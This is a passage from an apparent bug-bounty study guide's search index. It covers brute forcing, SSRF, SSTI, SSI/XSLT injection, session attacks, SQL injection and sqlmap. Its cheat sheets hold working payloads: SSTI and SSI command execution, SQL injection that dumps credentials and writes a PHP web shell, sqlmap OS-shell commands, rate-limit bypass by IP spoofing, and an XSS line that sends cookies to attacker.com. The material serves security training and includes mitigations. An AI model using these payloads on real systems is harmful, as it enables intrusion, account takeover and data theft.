missing them limits testing scope.</li> <li>Example: A login page at <code>/login</code> or a reset token field at <code>/reset?token=abc</code>.</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#3-analyze-remember-me-for-predictability","title":"3. Analyze \"Remember Me\" for Predictability","text":"<ul> <li>Explanation: Decode \"remember me\" cookies to check for predictable patterns (e.g., username+timestamp or weak hashes).</li> <li>Why It's Done: Predictable cookies can be forged, bypassing login entirely.</li> <li>Example: Cookie <code>remember=base64(username:timestamp)</code> can be recreated for another user.</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#4-enumerate-valid-usernames","title":"4. Enumerate Valid Usernames","text":"<ul> <li>Explanation: Test usernames with invalid passwords to detect response differences (e.g., timing, error messages) that confirm valid users.</li> <li>Why It's Done: Valid usernames focus brute force efforts, increasing efficiency.</li> <li>Example: <code>/login?user=admin&amp;pass=wrong</code> returns \"Invalid password\" vs \"User not found\" for invalid users.</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#5-brute-force-passwords-or-tokens","title":"5. Brute Force Passwords or Tokens","text":"<ul> <li>Explanation: Use tools like Hydra (<code>hydra -l user -P pass.txt http-post-form \"/login:user=^USER^&amp;pass=^PASS^:F=invalid\"</code>) or Medusa to try password lists or token combinations.</li> <li>Why It's Done: Weak passwords or tokens allow unauthorized access.</li> <li>Example: Brute force <code>/login</code> with common passwords like <code>password123</code>.</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#6-use-custom-wordlists","title":"6. Use Custom Wordlists","text":"<ul> <li>Explanation: Generate targeted wordlists with tools like <code>username-anarchy</code> for usernames or <code>cupp</code> for passwords based on target info.</li> <li>Why It's Done: Personalized lists increase success rates over generic ones.</li> <li>Example: <code>cupp -i</code> to create passwords based on user\u2019s name or interests.</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#7-bypass-rate-limits-or-captchas","title":"7. Bypass Rate Limits or CAPTCHAs","text":"<ul> <li>Explanation: Rotate IPs (via proxies) to evade rate limits, or check for CAPTCHA solutions in HTML or weak validation (e.g., reusable tokens).</li> <li>Why It's Done: Bypassing protections allows unlimited attempts.</li> <li>Example: Use <code>X-Forwarded-For: 1.2.3.4</code> to spoof IP in Burp.</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#8-test-credential-stuffing-or-spraying","title":"8. Test Credential Stuffing or Spraying","text":"<ul> <li>Explanation: Try leaked credentials from breaches (credential stuffing) or common passwords across multiple accounts (spraying).</li> <li>Why It's Done: Exploits password reuse or weak defaults.</li> <li>Example: Test <code>admin:admin</code> across multiple accounts.</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#9-exploit-successful-guesses","title":"9. Exploit Successful Guesses","text":"<ul> <li>Explanation: Use valid credentials or tokens to access the application, escalate privileges, or extract data.</li> <li>Why It's Done: Demonstrates impact, like account takeover or sensitive data access.</li> <li>Example: Use guessed password to log in as admin and access <code>/admin</code>.</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing-guide/#10-assess-prevention-measures","title":"10. Assess Prevention Measures","text":"<ul> <li>Explanation: Check for rate limiting, lockouts, strong password policies, or 2FA.</li> <li>Why It's Done: Informs remediation, like enforcing CAPTCHAs or minimum password complexity.</li> <li>Example: Secure apps lock accounts after 5 failed attempts.</li> </ul> <p>This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, equips hunters to test brute forcing vulnerabilities ethically. Always respect program scope.</p>"},{"location":"bug-bounty-guide/server-side-attacks-guide/","title":"Server-Side Attacks","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#step-by-step-guide-for-testing-and-exploiting-server-side-vulnerabilities","title":"Step-by-Step Guide for Testing and Exploiting Server-Side Vulnerabilities","text":""},{"location":"bug-bounty-guide/server-side-attacks-guide/#1-understand-server-side-vulnerabilities","title":"1. Understand Server-Side Vulnerabilities","text":"<ul> <li>Explanation: Server-side vulnerabilities include Server-Side Request Forgery (SSRF), Server-Side Template Injection (SSTI), Server-Side Includes (SSI), and XSLT Injection, which allow attackers to forge internal requests, execute code via templates, or access files. SSRF targets internal resources, SSTI exploits template engines, and SSI/XSLT manipulate server directives or XML processing.</li> <li>Why It's Done: Knowing these vulnerabilities helps identify specific input points and payloads for testing, as each has unique exploitation methods.</li> <li>Example: SSRF might allow access to <code>http://localhost/admin</code>, while SSTI could execute <code>{{7*7}}</code> in a template.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#2-identify-entry-points","title":"2. Identify Entry Points","text":"<ul> <li>Explanation: Find inputs that trigger server-side processing, such as URL parameters for fetching resources (SSRF), template inputs (SSTI), or XML/submit fields (SSI/XSLT). Use Burp to map these.</li> <li>Why It's Done: These are injection points for server-side attacks; missing them limits testing scope.</li> <li>Example: A stock check API with <code>stockApi=http://external.com</code> for SSRF.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#3-test-for-ssrf","title":"3. Test for SSRF","text":"<ul> <li>Explanation: Inject internal URLs (e.g., <code>http://127.0.0.1:8080/admin</code>) or file schemes (<code>file:///etc/passwd</code>) to see if the server makes unauthorized requests.</li> <li>Why It's Done: SSRF can access internal services, metadata, or files, revealing sensitive data.</li> <li>Example: Change <code>stockApi=http://external.com</code> to <code>stockApi=http://localhost/admin</code> and check response.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#4-exploit-blind-ssrf","title":"4. Exploit Blind SSRF","text":"<ul> <li>Explanation: If no response is visible, use out-of-band (OAST) techniques like DNS (<code>http://attacker.com</code>) or HTTP requests to confirm SSRF.</li> <li>Why It's Done: Blind SSRF is harder to detect but can still exfiltrate data via external interactions.</li> <li>Example: <code>stockApi=http://</code>whoami<code>.burpcollaborator.net</code> to send server data via DNS.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#5-bypass-ssrf-defenses","title":"5. Bypass SSRF Defenses","text":"<ul> <li>Explanation: Use alternative formats like <code>127.1</code>, <code>@internal.com</code>, or open redirects to bypass blacklists or whitelists.</li> <li>Why It's Done: Many SSRF protections filter only common patterns, allowing creative bypasses.</li> <li>Example: <code>stockApi=http://127.0.0.1#@internal.com</code> to trick filters.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#6-test-for-ssti","title":"6. Test for SSTI","text":"<ul> <li>Explanation: Inject template syntax like <code>${{&lt;%[%'\"}}%\\.</code> or <code>{{7*7}}</code> into inputs rendered by template engines (e.g., Jinja2, Twig).</li> <li>Why It's Done: Confirms if user input is evaluated as template code, potentially leading to RCE.</li> <li>Example: Input <code>{{7*7}}</code> in a username field; if output is <code>49</code>, it\u2019s vulnerable.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#7-identify-template-engine","title":"7. Identify Template Engine","text":"<ul> <li>Explanation: Use engine-specific payloads (e.g., <code>{{7*'7'}}</code> for Twig vs <code>{%7*7%}</code> for Jinja2) and error messages to identify the engine.</li> <li>Why It's Done: Each engine has unique syntax for exploitation, ensuring accurate payloads.</li> <li>Example: Error mentioning <code>Jinja2</code> or Twig-specific output like <code>7777777</code>.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#8-exploit-ssti-for-rce","title":"8. Exploit SSTI for RCE","text":"<ul> <li>Explanation: Use engine-specific payloads to execute commands, like <code>{{self._filename.__class__.__init__.__globals__['os'].popen('id').read()}}</code> for Jinja2.</li> <li>Why It's Done: Escalates from code evaluation to full command execution.</li> <li>Example: Input <code>{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}</code> to get server user.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#9-test-for-ssi-and-xslt-injection","title":"9. Test for SSI and XSLT Injection","text":"<ul> <li>Explanation: For SSI, inject directives like <code>&lt;!--#exec cmd=\"id\" --&gt;</code> in inputs like user-agent or forms. For XSLT, submit XML with <code>&lt;xsl:value-of select=\"system('id')\"/&gt;</code> or file reads.</li> <li>Why It's Done: These allow command execution or file access if the server processes SSI or XSLT.</li> <li>Example: SSI in user-agent: <code>&lt;!--#exec cmd=\"ls\" --&gt;</code>, accessed via log inclusion.</li> </ul>"},{"location":"bug-bounty-guide/server-side-attacks-guide/#10-assess-prevention-measures","title":"10. Assess Prevention Measures","text":"<ul> <li>Explanation: Check for input validation, sandboxing, or disabled external entities (XXE) and URL includes.</li> <li>Why It's Done: Provides remediation recommendations, like disabling SSI or using safe template engines.</li> <li>Example: Secure app blocks external URLs in SSRF or uses static templates.</li> </ul> <p>This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, provides a detailed process for testing server-side vulnerabilities. Test ethically within scope.</p>"},{"location":"bug-bounty-guide/server-side-cheat/","title":"Server-side Attacks Cheat Sheet","text":""},{"location":"bug-bounty-guide/server-side-cheat/#ssrf","title":"SSRF","text":""},{"location":"bug-bounty-guide/server-side-cheat/#exploitation","title":"Exploitation","text":"<ul> <li>internal portscan by accessing ports on localhost</li> <li>accessing restricted endpoints</li> </ul>"},{"location":"bug-bounty-guide/server-side-cheat/#protocols","title":"Protocols","text":"<ul> <li><code>http://127.0.0.1/</code></li> <li><code>file:///etc/passwd</code></li> <li><code>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin</code></li> </ul>"},{"location":"bug-bounty-guide/server-side-cheat/#ssti","title":"SSTI","text":""},{"location":"bug-bounty-guide/server-side-cheat/#exploitation_1","title":"Exploitation","text":"<p>Templating Engines are used to dynamically generate content</p>"},{"location":"bug-bounty-guide/server-side-cheat/#test-string","title":"Test String","text":"<ul> <li><code>${{&lt;%[%'\"}}%\\.</code></li> </ul>"},{"location":"bug-bounty-guide/server-side-cheat/#ssi-injection-directives","title":"SSI Injection - Directives","text":"Directive Description <code>&lt;!--#printenv --&gt;</code> Print variables <code>&lt;!--#config errmsg=\"Error!\" --&gt;</code> Change config <code>&lt;!--#echo var=\"DOCUMENT_NAME\" var=\"DATE_LOCAL\" --&gt;</code> Print specific variable <code>&lt;!--#exec cmd=\"whoami\" --&gt;</code> Execute command <code>&lt;!--#include virtual=\"index.html\" --&gt;</code> Include web file"},{"location":"bug-bounty-guide/server-side-cheat/#xslt-injection","title":"XSLT Injection","text":""},{"location":"bug-bounty-guide/server-side-cheat/#elements","title":"Elements","text":"Element Description <code>&lt;xsl:template&gt;</code> Indicates an XSL template. Can contain a match attribute that contains a path in the XML-document that the template applies to <code>&lt;xsl:value-of&gt;</code> Extracts the value of the XML node specified in the select attribute <code>&lt;xsl:for-each&gt;</code> Enables looping over all XML nodes specified in the select attribute <code>&lt;xsl:sort&gt;</code> Specifies the node to sort elements in a for loop by in the select argument. A sort order may be specified in the order argument <code>&lt;xsl:if&gt;</code> Used to test for conditions on a node. The condition is specified in the test argument"},{"location":"bug-bounty-guide/server-side-cheat/#injection-payloads","title":"Injection Payloads","text":""},{"location":"bug-bounty-guide/server-side-cheat/#information-disclosure","title":"Information Disclosure","text":"Payload Description <code>&lt;xsl:value-of select=\"system-property('xsl:version')\" /&gt;</code> <code>&lt;xsl:value-of select=\"system-property('xsl:vendor')\" /&gt;</code> <code>&lt;xsl:value-of select=\"system-property('xsl:vendor-url')\" /&gt;</code> <code>&lt;xsl:value-of select=\"system-property('xsl:product-name')\" /&gt;</code> <code>&lt;xsl:value-of select=\"system-property('xsl:product-version')\" /&gt;</code>"},{"location":"bug-bounty-guide/server-side-cheat/#lfi","title":"LFI","text":"Payload Description <code>&lt;xsl:value-of select=\"unparsed-text('/etc/passwd', 'utf-8')\" /&gt;</code> <code>&lt;xsl:value-of select=\"php:function('file_get_contents','/etc/passwd')\" /&gt;</code>"},{"location":"bug-bounty-guide/server-side-cheat/#rce","title":"RCE","text":"Payload Description <code>&lt;xsl:value-of select=\"php:function('system','id')\" /&gt;</code>"},{"location":"bug-bounty-guide/session-security-guide/","title":"Session Security","text":""},{"location":"bug-bounty-guide/session-security-guide/#overview","title":"Overview","text":"<p>Session security vulnerabilities occur when the mechanisms used to manage user sessions\u2014typically through cookies or tokens\u2014are poorly implemented. These vulnerabilities allow attackers to hijack active sessions, fix session identifiers to gain unauthorized access, or forge requests to perform actions on behalf of users. Common issues include weak session ID generation, improper session timeouts, and insufficient protection against Cross-Site Request Forgery (CSRF). Understanding these risks is crucial for securing web applications and identifying exploitable weaknesses in bug bounty programs.</p>"},{"location":"bug-bounty-guide/session-security-guide/#session-hijacking","title":"Session Hijacking","text":"<ul> <li>Description: Session hijacking involves an attacker stealing a valid session token, often through techniques like Cross-Site Scripting (XSS) or network sniffing. Once obtained, the attacker can impersonate the victim, accessing their account without credentials.</li> <li>Examples: An XSS payload like <code>&lt;script&gt;new Image().src='http://attacker.com/?c='+document.cookie;&lt;/script&gt;</code> sends the session cookie to the attacker's server. Weak transport (HTTP instead of HTTPS) allows sniffing via tools like Wireshark.</li> <li>Mitigation: Set the <code>HttpOnly</code> flag to prevent JavaScript access to cookies, use the <code>Secure</code> flag to enforce HTTPS, and employ encryption (TLS) to protect transmission.</li> </ul>"},{"location":"bug-bounty-guide/session-security-guide/#session-fixation","title":"Session Fixation","text":"<ul> <li>Description: In session fixation, an attacker provides a victim with a known session ID before authentication. If the application accepts this ID post-login without regeneration, the attacker can use it to hijack the session.</li> <li>Examples: An attacker sends a link with <code>?sessionid=abc123</code> to the victim. After login, the same ID remains active, allowing the attacker to reuse it.</li> <li>Mitigation: Generate a new session ID upon successful authentication and invalidate the old one. Implement session ID rotation to prevent reuse of pre-set values.</li> </ul>"},{"location":"bug-bounty-guide/session-security-guide/#csrf-cross-site-request-forgery","title":"CSRF (Cross-Site Request Forgery)","text":"<ul> <li>Description: CSRF tricks a user into performing actions on a site where they are authenticated, typically via a forged HTTP request (GET or POST) from another domain. This exploits the trust a site has in the user\u2019s browser session.</li> <li>Examples: A malicious site hosts a hidden form <code>&lt;form action=\"https://bank.com/transfer\" method=\"POST\"&gt;&lt;input type=\"hidden\" name=\"amount\" value=\"1000\"&gt;</code> that submits when loaded, transferring funds if the user is logged into <code>bank.com</code>.</li> <li>Mitigation: Use unique, per-request CSRF tokens validated server-side, apply the <code>SameSite</code> cookie attribute (e.g., <code>SameSite=Strict</code>), and restrict sensitive actions to POST with token checks.</li> </ul>"},{"location":"bug-bounty-guide/session-security-guide/#additional-considerations","title":"Additional Considerations","text":"<ul> <li>Session Timeout: Sessions should expire after a reasonable period (e.g., 15-30 minutes of inactivity for sensitive apps) to limit exposure if a token is compromised. Implement absolute timeouts (e.g., 24 hours) for added security.</li> <li>Entropy and Randomness: Session IDs must be cryptographically random (e.g., 128-bit or more) to resist brute-force attacks. Weak IDs (e.g., sequential numbers) are easily guessed.</li> <li>Logout Functionality: Ensure logout invalidates the session ID server-side, not just client-side, to prevent reuse.</li> </ul>"},{"location":"bug-bounty-guide/session-security-guide/#prevention-strategies","title":"Prevention Strategies","text":"<ul> <li>Enforce strong, random session IDs with sufficient entropy (e.g., UUID v4 or secure random generators).</li> <li>Set appropriate session timeouts based on application sensitivity, balancing security and user experience.</li> <li>Use the <code>SameSite</code> attribute to mitigate CSRF, combined with secure cookie flags and token validation.</li> <li>Regularly audit session management code for weaknesses, using tools like OWASP ZAP to simulate attacks.</li> </ul> <p>This guide provides a detailed foundation for understanding session security, drawing from web security best practices and the provided cheat sheet. Explore further with resources like OWASP Session Management.</p>"},{"location":"bug-bounty-guide/sql-injection-guide/","title":"SQL Injection","text":"<p>Relative Cheat Sheet Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/sql-injection-guide/#step-by-step-guide-for-testing-and-exploiting-sql-injection-vulnerabilities","title":"Step-by-Step Guide for Testing and Exploiting SQL Injection Vulnerabilities","text":""},{"location":"bug-bounty-guide/sql-injection-guide/#1-understand-sql-injection-and-its-types","title":"1. Understand SQL Injection and Its Types","text":"<ul> <li>Explanation: SQL injection (SQLi) occurs when user input is concatenated into SQL queries without sanitization, allowing attackers to alter query logic. Types include union-based (retrieve data via UNION), blind (no direct output, use boolean/time-based), second-order (stored input used later), and error-based (trigger errors for info).</li> <li>Why It's Done: Knowing types helps choose testing methods; union for data dump, blind for hidden vulns. This step prevents blind testing.</li> <li>Example: Query <code>SELECT * FROM products WHERE category = 'Gifts'</code> becomes <code>SELECT * FROM products WHERE category = 'Gifts' OR 1=1--'</code> to return all products.</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#2-identify-entry-points-for-injection","title":"2. Identify Entry Points for Injection","text":"<ul> <li>Explanation: Scan for inputs feeding SQL queries, like search fields, logins, or filters. Use proxies like Burp to map params.</li> <li>Why It's Done: SQLi needs an injection point; identifying them focuses testing on high-risk areas.</li> <li>Example: URL param <code>?id=1</code> in <code>SELECT * FROM users WHERE id = '1'</code>.</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#3-test-for-vulnerability-with-basic-payloads","title":"3. Test for Vulnerability with Basic Payloads","text":"<ul> <li>Explanation: Inject <code>'</code> to break query and observe errors or behavior changes. Use <code>--</code> or <code>#</code> to comment out rest.</li> <li>Why It's Done: Triggers syntax errors if vulnerable, confirming unsanitized input.</li> <li>Example: <code>id=1'</code> causes error like \"Syntax error near ''\".</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#4-determine-database-type-and-columns","title":"4. Determine Database Type and Columns","text":"<ul> <li>Explanation: Use database-specific payloads (e.g., <code>@@version</code> for MySQL) and <code>ORDER BY n--</code> to find column count.</li> <li>Why It's Done: Tailors payloads; column count needed for union attacks.</li> <li>Example: <code>ORDER BY 3--</code> works, <code>ORDER BY 4--</code> errors, so 3 columns.</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#5-exploit-union-based-sqli","title":"5. Exploit Union-Based SQLi","text":"<ul> <li>Explanation: Append <code>UNION SELECT NULL,NULL--</code> (match columns), then extract data like <code>UNION SELECT username,password FROM users--</code>.</li> <li>Why It's Done: Dumps data directly in response for quick exploitation.</li> <li>Example: <code>id=-1' UNION SELECT table_name,NULL FROM information_schema.tables--</code> to list tables.</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#6-test-and-exploit-blind-sqli","title":"6. Test and Exploit Blind SQLi","text":"<ul> <li>Explanation: Use boolean (<code>AND 1=1</code> vs <code>AND 1=2</code>) for response differences, time delays (<code>SLEEP(5)</code>), or OAST for exfil.</li> <li>Why It's Done: When no data in response, blind methods infer info bit-by-bit.</li> <li>Example: <code>id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a</code>\u2014check response change.</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#7-enumerate-database-structure","title":"7. Enumerate Database Structure","text":"<ul> <li>Explanation: Query schema tables (e.g., <code>information_schema.tables</code> for MySQL) to list databases, tables, columns.</li> <li>Why It's Done: Maps DB for targeted data extraction.</li> <li>Example: <code>UNION SELECT table_name,NULL FROM information_schema.tables--</code>.</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#8-extract-sensitive-data","title":"8. Extract Sensitive Data","text":"<ul> <li>Explanation: Dump users, passwords, or files (LOAD_FILE for MySQL).</li> <li>Why It's Done: Core exploitation goal; leads to account takeover or escalation.</li> <li>Example: <code>UNION SELECT LOAD_FILE('/etc/passwd'),NULL--</code> for file read.</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#9-use-sqlmap-for-automation","title":"9. Use SQLMap for Automation","text":"<ul> <li>Explanation: Scan with <code>sqlmap -u URL --batch</code>, enumerate (<code>--tables</code>, <code>--dump</code>), exploit (<code>--os-shell</code> for RCE).</li> <li>Why It's Done: Automates tedious manual steps, handles blind/ complex cases.</li> <li>Example: <code>sqlmap -u \"http://example/vuln.php?id=1\" --dump -T users</code>.</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#10-escalate-to-rce-or-other-impacts","title":"10. Escalate to RCE or Other Impacts","text":"<ul> <li>Explanation: Use OUTFILE to write files (<code>SELECT 'shell' INTO OUTFILE '/var/www/shell.php'</code>), or chain with other vulns.</li> <li>Why It's Done: Beyond data leak, achieve shell access.</li> <li>Example: Write PHP shell for web access.</li> </ul>"},{"location":"bug-bounty-guide/sql-injection-guide/#11-assess-prevention-measures","title":"11. Assess Prevention Measures","text":"<ul> <li>Explanation: Check for prepared statements or parametrization to block injection.</li> <li>Why It's Done: Recommends fixes like using PDO in reports.</li> <li>Example: Vulnerable if concatenation used; secure if bound params.</li> </ul> <p>This guide, based on PortSwigger Web Security Academy, equips hunters to find and exploit SQLi ethically. Always scope and report responsibly.</p>"},{"location":"bug-bounty-guide/sqli-cheat/","title":"SQL Injection Fundamentals Cheat Sheet","text":""},{"location":"bug-bounty-guide/sqli-cheat/#mysql","title":"MySQL","text":""},{"location":"bug-bounty-guide/sqli-cheat/#general","title":"General","text":"Command Description <code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code> login to mysql database <code>SHOW DATABASES</code> List available databases <code>USE users</code> Switch to database"},{"location":"bug-bounty-guide/sqli-cheat/#tables","title":"Tables","text":"Command Description <code>CREATE TABLE logins (id INT, ...)</code> Add a new table <code>SHOW TABLES</code> List available tables in current database <code>DESCRIBE logins</code> Show table properties and columns <code>INSERT INTO table_name VALUES (value_1,..)</code> Add values to table <code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code> Add values to specific columns in a table <code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code> Update table values"},{"location":"bug-bounty-guide/sqli-cheat/#columns","title":"Columns","text":"Command Description <code>SELECT * FROM table_name</code> Show all columns in a table <code>SELECT column1, column2 FROM table_name</code> Show specific columns in a table <code>DROP TABLE logins</code> Delete a table <code>ALTER TABLE logins ADD newColumn INT</code> Add new column <code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code> Rename column <code>ALTER TABLE logins MODIFY oldColumn DATE</code> Change column datatype <code>ALTER TABLE logins DROP oldColumn</code> Delete column"},{"location":"bug-bounty-guide/sqli-cheat/#output","title":"Output","text":"Command Description <code>SELECT * FROM logins ORDER BY column_1</code> Sort by column <code>SELECT * FROM logins ORDER BY column_1 DESC</code> Sort by column in descending order <code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code> Sort by two-columns <code>SELECT * FROM logins LIMIT 2</code> Only show first two results <code>SELECT * FROM logins LIMIT 1, 2</code> Only show first two results starting from index 2 <code>SELECT * FROM logins WHERE &lt;condition&gt;</code> List results that meet a condition <code>SELECT * FROM logins WHERE username LIKE 'admin%'</code> List results where the name is similar to a given string"},{"location":"bug-bounty-guide/sqli-cheat/#mysql-operator-precedence","title":"MySQL Operator Precedence","text":"<ul> <li>Division (/), Multiplication (*), and Modulus (%)</li> <li>Addition (+) and Subtraction (-)</li> <li>Comparison (=, &gt;, &lt;, &lt;=, &gt;=, !=, LIKE)</li> <li>NOT (!)</li> <li>AND (&amp;&amp;)</li> <li>OR (||)</li> </ul>"},{"location":"bug-bounty-guide/sqli-cheat/#sql-injection","title":"SQL Injection","text":""},{"location":"bug-bounty-guide/sqli-cheat/#auth-bypass","title":"Auth Bypass","text":"Payload Description <code>admin' or '1'='1</code> Basic Auth Bypass <code>admin')-- -</code> Basic Auth Bypass With comments"},{"location":"bug-bounty-guide/sqli-cheat/#auth-bypass-payloads","title":"Auth Bypass Payloads","text":""},{"location":"bug-bounty-guide/sqli-cheat/#union-injection","title":"Union Injection","text":"Payload Description <code>' order by 1-- -</code> Detect number of columns using order by <code>cn' UNION select 1,2,3-- -</code> Detect number of columns using Union injection <code>cn' UNION select 1,@@version,3,4-- -</code> Basic Union injection <code>UNION select username, 2, 3, 4 from passwords-- -</code> Union injection for 4 columns"},{"location":"bug-bounty-guide/sqli-cheat/#db-enumeration","title":"DB Enumeration","text":"Payload Description <code>SELECT @@version</code> Fingerprint MySQL with query output <code>SELECT SLEEP(5)</code> Fingerprint MySQL with no output <code>cn' UNION select 1,database(),2,3-- -</code> Current database name <code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code> List all databases <code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code> List all tables in a specific database <code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code> List all columns in a specific table <code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code> Dump data from a table in another database"},{"location":"bug-bounty-guide/sqli-cheat/#privileges","title":"Privileges","text":"Payload Description <code>cn' UNION SELECT 1, user(), 3, 4-- -</code> Find current user <code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- -</code> Find if user has admin privileges <code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee=\"'root'@'localhost'\"-- -</code> Find if all user privileges <code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- -</code> Find which directories can be accessed through MySQL"},{"location":"bug-bounty-guide/sqli-cheat/#file-injection","title":"File Injection","text":"Payload Description <code>cn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- -</code> Read local file <code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code> Write a string to a local file <code>cn' union select \"\",'&lt;?php system($_REQUEST[0]); ?&gt;', \"\", \"\" into outfile '/var/www/html/shell.php'-- -</code> Write a web shell into the base web directory"},{"location":"bug-bounty-guide/sqlmap-cheat/","title":"SQLMap Essentials Cheat Sheet","text":""},{"location":"bug-bounty-guide/sqlmap-cheat/#commands","title":"Commands","text":"Command Description <code>sqlmap -h</code> View the basic help menu <code>sqlmap -hh</code> View the advanced help menu <code>sqlmap -u \"http://www.example.com/vuln.php?id=1\" --batch</code> Run SQLMap without asking for user input <code>sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'</code> SQLMap with POST request <code>sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'</code> POST request specifying an injection point with an asterisk <code>sqlmap -r req.txt</code> Passing an HTTP request file to SQLMap <code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code> Specifying a cookie header <code>sqlmap -u www.target.com --data='id=1' --method PUT</code> Specifying a PUT request <code>sqlmap -u \"http://www.target.com/vuln.php?id=1\" --batch -t /tmp/traffic.txt</code> Store traffic to an output file <code>sqlmap -u \"http://www.target.com/vuln.php?id=1\" -v 6 --batch</code> Specify verbosity level <code>sqlmap -u \"www.example.com/?q=test\" --prefix=\"%'))\" --suffix=\"-- -\"</code> Specifying a prefix or suffix <code>sqlmap -u www.example.com/?id=1 -v 3 --level=5</code> Specifying the level and risk <code>sqlmap -u \"http://www.example.com/?id=1\" --banner --current-user --current-db --is-dba</code> Basic DB enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --tables -D testdb</code> Table enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb -C name,surname</code> Table/row enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --where=\"name LIKE 'f%'\"</code> Conditional enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --schema</code> Database schema enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --search -T user</code> Searching for data <code>sqlmap -u \"http://www.example.com/?id=1\" --passwords --batch</code> Password enumeration and cracking <code>sqlmap -u \"http://www.example.com/\" --data=\"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE\" --csrf-token=\"csrf-token\"</code> Anti-CSRF token bypass <code>sqlmap --list-tampers</code> List all tamper scripts <code>sqlmap -u \"http://www.example.com/case1.php?id=1\" --is-dba</code> Check for DBA privileges <code>sqlmap -u \"http://www.example.com/?id=1\" --file-read \"/etc/passwd\"</code> Reading a local file <code>sqlmap -u \"http://www.example.com/?id=1\" --file-write \"shell.php\" --file-dest \"/var/www/html/shell.php\"</code> Writing a file <code>sqlmap -u \"http://www.example.com/?id=1\" --os-shell</code> Spawning an OS shell"},{"location":"bug-bounty-guide/using-web-proxies/","title":"Using Web Proxies","text":""},{"location":"bug-bounty-guide/using-web-proxies/#overview","title":"Overview","text":"<p>Web proxies intercept and manipulate HTTP/HTTPS traffic between client and server, aiding in security testing.</p>"},{"location":"bug-bounty-guide/using-web-proxies/#setting-up","title":"Setting Up","text":"<ul> <li>Burp Suite: Configure proxy on 127.0.0.1:8080, install certificate in browser.</li> <li>ZAP: Set up similarly, enable proxy on default port.</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#intercepting-web-requests","title":"Intercepting Web Requests","text":"<ul> <li>Capture requests in real-time, modify parameters or headers for testing.</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#intercepting-responses","title":"Intercepting Responses","text":"<ul> <li>Alter server responses to simulate vulnerabilities or test client behavior.</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#automatic-modification","title":"Automatic Modification","text":"<ul> <li>Use tools to automate changes (e.g., Burp Repeater) for repetitive tests.</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#repeating-requests","title":"Repeating Requests","text":"<ul> <li>Resend modified requests to analyze different outcomes.</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#encodingdecoding","title":"Encoding/Decoding","text":"<ul> <li>Convert data (URL encode/decode) to bypass filters or inspect encoded inputs.</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#proxying-tools","title":"Proxying Tools","text":"<ul> <li>Burp Intruder: Fuzz parameters.</li> <li>ZAP Fuzzer: Test input 